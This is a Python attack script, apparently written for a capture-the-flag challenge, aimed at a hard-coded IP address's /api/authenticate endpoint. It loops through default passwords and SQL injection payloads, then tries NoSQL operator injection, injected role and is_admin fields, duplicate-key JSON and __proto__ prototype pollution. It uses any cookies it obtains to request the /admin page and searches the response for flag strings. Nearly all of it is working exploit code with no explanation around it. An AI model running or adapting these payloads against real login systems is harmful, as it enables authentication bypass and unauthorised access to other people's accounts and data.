import requests
import json

TARGET = "http://18.212.136.134:5200/"

def exploit_api_authenticate():
    """Exploit the /api/authenticate endpoint with JSON"""
    
    # Test the API authenticate endpoint with various payloads
    test_payloads = [
        # Basic admin login attempt
        {"username": "admin", "password": "admin", "remember": True},
        {"username": "admin", "password": "password", "remember": True},
        {"username": "admin", "password": "admin123", "remember": True},
        # SQL injection attempts
        {"username": "admin' --", "password": "anything", "remember": True},
        {"username": "admin' OR '1'='1' --", "password": "anything", "remember": True},
        {"username": "admin", "password": "' OR '1'='1' --", "remember": True},
        # NoSQL injection
        {"username": {"$ne": "guest"}, "password": {"$ne": "guest123"}, "remember": True},
        {"username": "admin", "password": {"$regex": ".*"}, "remember": True},
        # Role manipulation in JSON
        {"username": "guest", "password": "guest123", "remember": True, "role": "admin"},
        {"username": "guest", "password": "guest123", "remember": True, "is_admin": True},
        # Parameter pollution
        {"username": "guest", "password": "guest123", "remember": True, "user": "admin"},
    ]
    
    for i, payload in enumerate(test_payloads):
        print(f"Testing payload {i+1}: {payload}")
        
        headers = {'Content-Type': 'application/json'}
        response = requests.post(TARGET + 'api/authenticate', json=payload, headers=headers)
        
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text[:500]}")
        
        # Check if we got a session cookie or different response
        if response.cookies:
            print(f"Cookies received: {response.cookies.get_dict()}")
        
        # If successful, try to access admin
        if response.status_code == 200 and 'success' in response.text.lower():
            session = requests.Session()
            # Use the cookies from the response
            if response.cookies:
                session.cookies.update(response.cookies)
            
            admin_response = session.get(TARGET + 'admin')
            if 'Access Denied' not in admin_response.text and 'Login' not in admin_response.text:
                print("SUCCESS! Admin access granted!")
                print(f"Admin content: {admin_response.text}")
                if 'FLAG{' in admin_response.text or 'PCTF{' in admin_response.text:
                    print("FLAG FOUND!")
                    return True
        
        print("-" * 50)
    
    return False

def test_json_injection():
    """Test JSON-specific injection techniques"""
    
    # JSON injection with duplicate keys (last one wins)
    payload = '{"username": "guest", "password": "guest123", "role": "guest", "role": "admin"}'
    
    headers = {'Content-Type': 'application/json'}
    response = requests.post(TARGET + 'api/authenticate', data=payload, headers=headers)
    print(f"JSON duplicate key test: {response.status_code}")
    print(f"Response: {response.text}")
    
    # Try prototype pollution
    pollutions = [
        '{"username": "guest", "password": "guest123", "__proto__": {"role": "admin"}}',
        '{"username": "guest", "password": "guest123", "constructor": {"prototype": {"role": "admin"}}}',
    ]
    
    for pollution in pollutions:
        response = requests.post(TARGET + 'api/authenticate', data=pollution, headers=headers)
        print(f"Prototype pollution test: {response.status_code}")
        if response.status_code == 200:
            print(f"Response: {response.text}")

# Run the exploits
print("=== EXPLOITING API AUTHENTICATE ENDPOINT ===")
if not exploit_api_authenticate():
    print("\n=== TESTING JSON INJECTION ===")
    test_json_injection()